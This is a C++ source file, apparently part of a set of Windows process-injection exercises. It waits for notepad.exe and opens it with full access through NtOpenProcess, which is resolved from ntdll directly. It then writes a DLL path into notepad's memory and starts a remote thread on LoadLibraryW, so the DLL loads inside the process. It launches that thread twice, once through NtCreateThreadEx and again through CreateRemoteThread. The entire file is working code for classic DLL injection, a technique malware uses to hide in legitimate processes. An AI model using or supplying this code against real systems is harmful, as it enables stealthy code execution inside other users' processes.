#include <cstdio>
#include <unistd.h>
#include <ntdef.h>
#include "../../include/utils.h"
#include "../../include/ntdllfunc.h"

DWORD WaitForNotepad() {
    DWORD dNotepadPid = 0;
    int i = 0;
    while (true) {
        printf("[-] Searching for notepad...\n");
        dNotepadPid = FindFirstNotepad();
        if (!dNotepadPid) {
            printf("[!] No notepad found! Waiting for round %d...\n", i++);
            sleep(5);
        }
        else break;
    }
    return dNotepadPid;
}

int main() {
    // Vars
    DWORD dNotepadPid = 0;
    HANDLE hNotepad = nullptr;
    OBJECT_ATTRIBUTES oa = {sizeof oa, nullptr};
    CLIENT_ID clientId = {nullptr, nullptr};
    HANDLE hRemoteThread;
    HMODULE hKernel32 = nullptr;
    HMODULE hNtDll = nullptr;
    PTHREAD_START_ROUTINE lpLoadLibAddr = nullptr;
    PVOID lpAllocatedMemory = 0;
    NTSTATUS status;
    auto * dRemotePid = (DWORD *) malloc(sizeof(DWORD));
    LPFUN_NtCreateThreadEx lpCreateThreadEx;
    LPFUN_NtAllocateVirtualMemory lpAllocateVirtualMemory;
    LPFUN_NtOpenProcess lpOpenProcess;
    wchar_t cDllLocation[MAX_PATH] = LR"(C:\Users\Public\dlls\libbasicdll.dll)";
    size_t sSizeDllLocation = sizeof(cDllLocation);
    // Getting addresses
    if (!(hKernel32 = GetModuleHandle(TEXT("Kernel32")))) goto error;
    if (!(hNtDll = GetModuleHandle(TEXT("ntdll.dll")))) goto error;
    printf("[+] Found module handles\n");
    if (!(lpOpenProcess = (LPFUN_NtOpenProcess) GetProcAddress(hNtDll, "NtOpenProcess"))) goto error;
    if (!(lpAllocateVirtualMemory = (LPFUN_NtAllocateVirtualMemory) GetProcAddress(hNtDll, "NtAllocateVirtualMemory"))) goto error;
    // WriteProcessMemory
    if (!(lpCreateThreadEx = (LPFUN_NtCreateThreadEx) GetProcAddress(hNtDll, "NtCreateThreadEx"))) goto error;
    if (!(lpLoadLibAddr = (PTHREAD_START_ROUTINE) GetProcAddress(hKernel32, "LoadLibraryW"))) goto error;
    printf("[+] Found function addresses\n");
    // Code
    dNotepadPid = WaitForNotepad();
    clientId.UniqueProcess = (HANDLE) dNotepadPid;
    printf("[+] Found notepad.exe with PID %lu\n", dNotepadPid);
//    if(!(hNotepad = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dNotepadPid))) goto error;
    if(!NT_SUCCESS(status = lpOpenProcess(&hNotepad, PROCESS_ALL_ACCESS, &oa, &clientId))) goto nt_error;
    printf("[+] Opened notepad.exe process\n");
    // Injecting
    if(!NT_SUCCESS(status = lpAllocateVirtualMemory(hNotepad, &lpAllocatedMemory, 0, &sSizeDllLocation, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) goto nt_error;
    printf("[+] Allocated %zu bytes in process for payload of size %llu\n", sSizeDllLocation, sizeof(cDllLocation));
    if(!WriteProcessMemory(hNotepad, lpAllocatedMemory, (LPVOID) cDllLocation, sizeof(cDllLocation), nullptr)) goto error;
    printf("[+] DLL injected\n");
    if(!NT_SUCCESS(status = lpCreateThreadEx(&hRemoteThread, THREAD_ALL_ACCESS, nullptr, hNotepad, (LPTHREAD_START_ROUTINE) lpLoadLibAddr, lpAllocatedMemory, FALSE, 0, 0, 0, nullptr))) goto nt_error;
    CreateRemoteThread(hNotepad, nullptr, 0, lpLoadLibAddr, lpAllocatedMemory, 0, dRemotePid);
    printf("[+] Remote thread started\n");
    CloseHandle(hNotepad);
    return EXIT_SUCCESS;
    // Kill everything
    error:
    if (hNotepad) CloseHandle(hNotepad);
    printError((GetLastError()));
    return EXIT_FAILURE;
    nt_error:
    if (hNotepad) CloseHandle(hNotepad);
    printf("[!] NT_STATUS error code: %lu\n", status);
    return EXIT_FAILURE;
}